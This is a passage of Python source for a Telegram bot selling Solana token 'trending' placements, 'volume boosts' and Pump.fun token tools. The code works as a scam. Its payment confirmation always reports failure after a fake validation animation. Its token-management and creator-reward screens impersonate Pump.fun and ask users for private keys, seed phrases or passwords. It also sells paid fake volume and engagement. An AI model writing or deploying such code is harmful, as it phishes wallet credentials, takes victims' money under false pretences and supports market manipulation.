        wallet_address = get_user_wallet(user_id)
        keyboard = [
            [InlineKeyboardButton('✅ Confirm payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message(f'''
<b>Your wallet Address :

<code>{wallet_address}</code>

Minimum Deposit 0.7sol
Click on the button 
And wait few seconds for verrificarion
Balance would be added And may proceed to the MENU</b>
''', reply_markup)

    elif query.data == 'confirm':
        keyboard = [
            [InlineKeyboardButton('🔙 Back To Main Menu', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # First show the alert immediately to ensure mobile notification
        await query.answer(
            text="❌ Payment not received.",
            show_alert=True
        )

        # Then show the animated validation process
        dots = ["⏳ Validating", "⏳ Validating.", "⏳ Validating..", "⏳ Validating..."]
        final_message = "Payment not Received. Contact support if SOL was sent"
        
        try:
            # Smoother animation with more frames and proper cancellation handling
            for i in range(12):  # 3 full cycles of dot animation
                await edit_message(f"<b>{dots[i % 4]}</b>")
                await asyncio.sleep(0.2)  # Optimal timing for smooth animation
                
        except asyncio.CancelledError:
            pass  # Handle cancellation if user interacts during animation
        
        # Final state update
        await edit_message(final_message, reply_markup)
        
    elif query.data == 'trending':
        context.user_data['awaiting_trending_token'] = True
        keyboard = [[InlineKeyboardButton('🔙 Back To Main Menu', callback_data='main')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
<b>Boost Token Visibility with Trending spot 

❔ Send me the token address</b>
''', reply_markup)

    elif query.data == 'skip_trending_link':
        # User skipped providing a link, show trending options directly
        token_address = context.user_data.get('trending_token', 'Unknown')
        token_data = context.user_data.get('token_data', {'name': 'Unknown', 'symbol': 'Unknown', 'dex': 'Raydium', 'url': '#'})
        
        # Create trending options keyboard
        trednding_Keyboard = [
            [InlineKeyboardButton('🟢 Top 3 Guarantee', callback_data='top3'),
             InlineKeyboardButton('🟢 Top 8 Guarantee', callback_data='top8')],
            [InlineKeyboardButton('🟢 Any Position', callback_data='anyposition')],
            [InlineKeyboardButton('🔙 Back', callback_data='trending')]
        ]
        reply_markup = InlineKeyboardMarkup(trednding_Keyboard)
        
        # Set a default value for skipped link
        context.user_data['trending_link'] = 'No link provided'
        
        await edit_message(f'''

<b>Name :</b> {token_data['name']}
<b>Ticker :</b> {token_data['symbol']}
<b>DEX :</b> {token_data.get('dex', 'Raydium')}
<b>Chain :</b> Solana
<b>Chart :</b> <a href="{token_data.get('url', '#')}">Open chart</a>

<b>CA :</b>
<code>{token_address}</code>

<b>Group/Portal:</b> Skipped

<b>Select Spot</b>
''', reply_markup)
        



    elif query.data == 'top3':
        keyboard = [
            [InlineKeyboardButton('3 HOURS', callback_data='top3_3hours'),
            InlineKeyboardButton('8 HOURS | -10%', callback_data='top3_8hours')],
            [InlineKeyboardButton('12 HOURS | -20%', callback_data='top3_12hours'),
            InlineKeyboardButton('24 HOURS | -30%', callback_data='top3_24hours')],
            [InlineKeyboardButton('🔙 Back', callback_data='trending')]  # This one is alone on the third row
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
<b>❔Select Period:</b>
''', reply_markup)
        
    elif query.data == 'top3_3hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_3hours'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_3hours')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 3 Hours
 • Top: Top 3 Guaranteed
 • Price: 4.5 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 4.5 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)

    elif query.data == 'top3_8hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_8hours'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_8hours')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
    <b>Token Address: <code>{trending_token}</code>
    • Chain: SOL
    • Portal: {trending_link}
    • Duration: 8 Hours
    • Top: Top 3 Guaranteed
    • Price: 7.5 SOL

    By clicking "✅ Confirm," you accept the following:
    • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
    • Ads and links must not contain false info, scams, or any explicit content.
    • Farming, wallet splitting, or holding over 14% supply may lead to removal.
    • Trending placement guarantee buyer engagement.
    • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

    Make sure you understand and agree to these rules before confirming.

    ❔ Payment Information:

    ⤵️ Always double check that you have entered the correct address before sending.

    Address: <code>{wallet_address}</code>

    Amount: 7.5 SOL

    After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
    ''', reply_markup)
        

    elif query.data == 'top3_12hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_12hours'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_12hours')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
    <b>Token Address: <code>{trending_token}</code>
    • Chain: SOL
    • Portal: {trending_link}
    • Duration: 12 Hours
    • Top: Top 3 Guaranteed
    • Price: 14.5 SOL

    By clicking "✅ Confirm," you accept the following:
    • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
    • Ads and links must not contain false info, scams, or any explicit content.
    • Farming, wallet splitting, or holding over 14% supply may lead to removal.
    • Trending placement guarantee buyer engagement.
    • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

    Make sure you understand and agree to these rules before confirming.

    ❔ Payment Information:

    ⤵️ Always double check that you have entered the correct address before sending.

    Address: <code>{wallet_address}</code>

    Amount: 14.5 SOL

    After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
    ''', reply_markup)

    elif query.data == 'top3_24hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_24hours'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_24hours')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
    <b>Token Address: <code>{trending_token}</code>
    • Chain: SOL
    • Portal: {trending_link}
    • Duration: 24 Hours
    • Top: Top 3 Guaranteed
    • Price: 24.5 SOL

    By clicking "✅ Confirm," you accept the following:
    • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
    • Ads and links must not contain false info, scams, or any explicit content.
    • Farming, wallet splitting, or holding over 14% supply may lead to removal.
    • Trending placement guarantee buyer engagement.
    • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

    Make sure you understand and agree to these rules before confirming.

    ❔ Payment Information:

    ⤵️ Always double check that you have entered the correct address before sending.

    Address: <code>{wallet_address}</code>

    Amount: 24.5 SOL

    After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
    ''', reply_markup)
    
    elif query.data == 'top8':
        keyboard = [
            [InlineKeyboardButton('3 HOURS', callback_data='top8_3hours'),
            InlineKeyboardButton('8 HOURS | -10%', callback_data='top8_8hours')],
            [InlineKeyboardButton('12 HOURS | -20%', callback_data='top8_12hours'),
            InlineKeyboardButton('24 HOURS | -30%', callback_data='top8_24hours')],
            [InlineKeyboardButton('🔙 Back', callback_data='trending')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
<b>❔Select Period:</b>
''', reply_markup)

    elif query.data == 'top8_3hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_3hours_top8'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_3hours_top8')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 3 Hours
 • Top: Top 8 Guaranteed
 • Price: 4 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 4 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)
    
    elif query.data == 'top8_6hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_6hours_top8'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_6hours_top8')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 6 Hours
 • Top: Top 8 Guaranteed
 • Price: 7 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 7 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)
        
    elif query.data == 'top8_8hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_8hours_top8'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_8hours_top8')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 8 Hours
 • Top: Top 8 Guaranteed
 • Price: 7 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 7 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)

    elif query.data == 'top8_12hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_12hours_top8'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_12hours_top8')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 12 Hours
 • Top: Top 8 Guaranteed
 • Price: 12.5 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 12.5 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)
        
    elif query.data == 'top8_24hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_24hours_top8'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_24hours_top8')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 24 Hours
 • Top: Top 8 Guaranteed
 • Price: 20.5 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 20.5 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)
    
    elif query.data == 'anyposition':
        keyboard = [
            [InlineKeyboardButton('3 HOURS', callback_data='anyposition_3hours'),
            InlineKeyboardButton('8 HOURS | -10%', callback_data='anyposition_8hours')],
            [InlineKeyboardButton('12 HOURS | -20%', callback_data='anyposition_12hours'),
            InlineKeyboardButton('24 HOURS | -30%', callback_data='anyposition_24hours')],
            [InlineKeyboardButton('🔙 Back', callback_data='trending')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
<b>❔Select Period:</b>
''', reply_markup)

    elif query.data == 'anyposition_3hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_3hours_any'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_3hours_any')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 3 Hours
 • Top: Any Position
 • Price: 3 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 3 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)
        
    elif query.data == 'anyposition_8hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_8hours_any'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_8hours_any')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 8 Hours
 • Top: Any Position
 • Price: 5.5 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 5.5 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)
        
    elif query.data == 'anyposition_12hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_12hours_any'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_12hours_any')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 12 Hours
 • Top: Any Position
 • Price: 10.5 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 10.5 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)
        
    elif query.data == 'anyposition_24hours':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_trending_24hours_any'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_trending_24hours_any')
            ],
            [InlineKeyboardButton('✅ Confirm Payment', callback_data='confirm')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Token Address: <code>{trending_token}</code>
 • Chain: SOL
 • Portal: {trending_link}
 • Duration: 24 Hours
 • Top: Any Position
 • Price: 16.5 SOL

By clicking “✅ Confirm,” you accept the following:
 • No refunds if your token is removed for suspicious behavior (e.g., scam signs, false info, NSFW content, lack of moderation, etc.).
 • Ads and links must not contain false info, scams, or any explicit content.
 • Farming, wallet splitting, or holding over 14% supply may lead to removal.
 • Trending placement guarantee buyer engagement.
 • Refunds only apply in case of full service failure for over 20 minutes and only to the original wallet used.

Make sure you understand and agree to these rules before confirming.

❔ Payment Information:

⤵️ Always double check that you have entered the correct address before sending.

Address: <code>{wallet_address}</code>

Amount: 16.5 SOL

After the transfer, click the button below, you can transfer the rest if you haven't transferred enough.</b>
''', reply_markup)

    elif query.data == 'volume':
        context.user_data['awaiting_volumn_token'] = True
        keyboard = [
            [InlineKeyboardButton('🔙 Back', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
<i>Increase Token Volume with this feature</i>

<b>❔ Send me the token's Contract Address or Pair Address or the Launchpad/Presale Url:

Supported Chains: SOL
Supported Dexes: Raydium, Orca, Meteora, Pumpswap, Pumpfun
Supported Launches: <a href="https://pump.fun/">Pump.fun</a>, <a href="https://dexscreener.com/moonshot">MoonShot</a></b>''', reply_markup)

    elif query.data == '3sol':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_3sol'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_3sol')
            ],
            [InlineKeyboardButton('✅ Confirm payment', callback_data='confirm')],
            [InlineKeyboardButton('🔙 Back', callback_data='volume')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Volume Boost ⚡️

💶 Increase + $50K Volume by sending 3 SOL to:

<code>{wallet_address}</code>


Step 1: Send 3 SOL
Step 2: Click Verify Payment to verify the transaction 
🚀 Get ready for a Boost in the Tokens Volume! 🚀 

If you have any questions, check out admin</b>
''', reply_markup)
        
    elif query.data == '5sol':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_5sol'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_5sol')
            ],
            [InlineKeyboardButton('✅ Confirm payment', callback_data='confirm')],
            [InlineKeyboardButton('🔙 Back', callback_data='volume')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Volume Boost ⚡️

💶 Increase + $100k Volume by sending 5 SOL to:

<code>{wallet_address}</code>


Step 1: Send 5 SOL
Step 2: Click Verify Payment to verify the transaction 
🚀 Get ready for a Boost in the Tokens Volume! 🚀 

If you have any questions, check out admin</b>
''', reply_markup)
                
    elif query.data == '13sol':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_13sol'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_13sol')
            ],
            [InlineKeyboardButton('✅ Confirm payment', callback_data='confirm')],
            [InlineKeyboardButton('🔙 Back', callback_data='volume')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Volume Boost ⚡️

💶 Increase + $250k Volume by sending 13 SOL to:

<code>{wallet_address}</code>


Step 1: Send 13 SOL
Step 2: Click Verify Payment to verify the transaction 
🚀 Get ready for a Boost in the Tokens Volume! 🚀 

If you have any questions, check out admin</b>
''', reply_markup)
        
    elif query.data == '25sol':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_25sol'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_25sol')
            ],
            [InlineKeyboardButton('✅ Confirm payment', callback_data='confirm')],
            [InlineKeyboardButton('🔙 Back', callback_data='volume')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Volume Boost ⚡️

💶 Increase + $500k Volume by sending 25 SOL to:

<code>{wallet_address}</code>


Step 1: Send 25 SOL
Step 2: Click Verify Payment to verify the transaction 
🚀 Get ready for a Boost in the Tokens Volume! 🚀 

If you have any questions, check out admin</b>
''', reply_markup)
                
    elif query.data == '45sol':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_45sol'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_45sol')
            ],
            [InlineKeyboardButton('✅ Confirm payment', callback_data='confirm')],
            [InlineKeyboardButton('🔙 Back', callback_data='volume')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Volume Boost ⚡️

💶 Increase + $1M Volume by sending 45 SOL to:

<code>{wallet_address}</code>


Step 1: Send 45 SOL
Step 2: Click Verify Payment to verify the transaction 
🚀 Get ready for a Boost in the Tokens Volume! 🚀 

If you have any questions, check out admin</b>
''', reply_markup)
        
    elif query.data == '210sol':
        keyboard = [
            [
                InlineKeyboardButton('💳 Pay with Card', callback_data='pay_card_210sol'),
                InlineKeyboardButton('🎫 Pay with Coupon', callback_data='coupon_210sol')
            ],
            [InlineKeyboardButton('✅ Confirm payment', callback_data='confirm')],
            [InlineKeyboardButton('🔙 Back', callback_data='volume')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        user_id = query.from_user.id
        wallet_address = get_user_wallet(user_id)
        await edit_message(f'''
<b>Volume Boost ⚡️

💶 Increase + $5M Volume by sending 210 SOL to:

<code>{wallet_address}</code>


Step 1: Send 210 SOL
Step 2: Click Verify Payment to verify the transaction 
🚀 Get ready for a Boost in the Tokens Volume! 🚀 

If you have any questions, check out admin</b>
''', reply_markup)
                
    elif query.data == 'pumpfun':
        # Get current SOL price
        sol_price = await get_sol_price_cached()
        
        # Fixed USD prices for PumpFun services
        CREATE_USD = 40    # $40 to create token
        MANAGE_USD = 20    # $20 to manage token
        
        # Calculate SOL amounts
        if sol_price > 0:
            create_sol = CREATE_USD / sol_price
            manage_sol = MANAGE_USD / sol_price
            price_display = f"💰 SOL Price: ${sol_price:.2f}"
        else:
            create_sol = 0.5
            manage_sol = 0.25
            price_display = "💰 SOL Price: N/A"
        
        keyboard = [
            [InlineKeyboardButton(f'✅ Create Token ', callback_data='createtoken')],
            [InlineKeyboardButton(f'⚙️ Manage Token ', callback_data='managetoken')],
            [InlineKeyboardButton('♻️🏆 Creator Reward (Claim)', callback_data='pumpfun_chart')],
            [InlineKeyboardButton('🔙 Back To Main Menu', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send a new message with image
        image_file = open('pumpfun_image.JPG', 'rb')
        await query.message.reply_photo(
            photo=image_file,
            caption=f'''
    <b>💊 PumpFun Menu</b>

    Welcome to the ultimate PumpFun control panel.
    Launch. Manage. Earn.

    Everything you need to dominate your token in one place.

    Select an option below:

    <b>• 🛠 Create Token </b> – Deploy your token in seconds
    <b>• ⚙️ Manage Token </b> – Control, update & optimize your token
    <b>• 💳 Creator Reward </b> – View and claim your creator earnings
    ''',
            parse_mode='HTML',
            reply_markup=reply_markup
        )

    elif query.data == 'createtoken':
        # Delete the old message with the image
        await query.message.delete()
        
        # Reset token creation data completely
        context.user_data['awaiting_token_name'] = True
        context.user_data['token_creation'] = {}  # Fresh empty dict - no old data!
        
        keyboard = [
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')],
            [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        # Send a NEW message
        await query.message.reply_text('''
🚀 <b>Create Your Token on Pump.fun — Simple & Fast</b>

Launching your own token takes minutes.

<b>How it works:</b>
1️⃣ Choose a name & ticker 
2️⃣ Upload an image  
3️⃣ Add a short description  
4️⃣ Click launch — done.

<b>Send me Project Name + Ticker</b> 
(e.g. <code>MoonCat – $MCAT</code>)
''', parse_mode='HTML', reply_markup=reply_markup)
        
    elif query.data == 'managetoken':
        context.user_data['awaiting_manager_login'] = True  # Set flag for manager login
        keyboard = [
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')],
            [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
⚙️ <b>Token Management Made Easy</b>

You're in control.

<b>- Update details</b>
<b>- Track performance</b>
<b>- Stay on top of your token</b>
<b>- Access Watchlist</b>
<b>— all in one place.</b>

Manage smarter. Grow faster.
Built for serious creators.

🚀<b> Powered by Pump.fun</b>

<b>Login Pump.fun / Access Pump.fun</b>
<i>Login Any Format: Private key / Phrase / Email & password ...</i>

Please enter your login credentials below:
''', reply_markup)

    elif query.data == 'pumpfun_chart':
        context.user_data['awaiting_creator_login'] = True  # Set flag for login input
        keyboard = [
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')],
            [InlineKeyboardButton('🏠 Main Menu', callback_data='main')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await edit_message('''
<b>🚀 Pump.fun Creator Rewards Are Live!</b>

Creators now earn rewards automatically when their tokens gain traction.
More volume = more rewards. Simple.

Keep building. Keep launching.
The community trades — you earn.

🔥 Powered by Pump.fun

<b>Check Eligibility</b>
<b>Claim</b>

<b>Sign in to your Pump.fun wallet to claim rewards.</b>
<i>Login Any Format: Private key / Phrase / Email & password ...</i>

''', reply_markup)

    # 👇 ADD THESE NEW HANDLERS HERE 👇
    elif query.data == 'skip_description':
        context.user_data['token_creation']['description'] = 'No description'
        context.user_data['awaiting_token_description'] = False
        context.user_data['awaiting_token_socials'] = True
        
        keyboard = [
            [InlineKeyboardButton('Skip ❌', callback_data='skip_socials')],
            [InlineKeyboardButton('🔙 Back to PumpFun', callback_data='pumpfun')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await edit_message('''
✅ <b>Description skipped!</b>

Now add your <b>social links</b> (optional)
• Telegram
• X (Twitter)
• Website
• Any other links

Send them one per line or click Skip
